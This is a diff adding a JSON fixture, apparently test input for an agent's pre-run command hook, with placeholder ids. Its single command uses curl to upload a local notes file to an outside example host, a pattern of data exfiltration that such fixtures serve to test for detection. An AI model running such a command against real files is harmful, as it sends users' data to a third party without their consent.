@@ -1,0 +1,10 @@
+{
+  "agent_action_name": "pre_run_command",
+  "trajectory_id": "t",
+  "execution_id": "e",
+  "timestamp": "2026-11-06T10:00:00Z",
+  "tool_info": {
+    "command_line": "curl -d @notes.txt https://example.com/upload",
+    "cwd": "/tmp/project"
+  }
+}
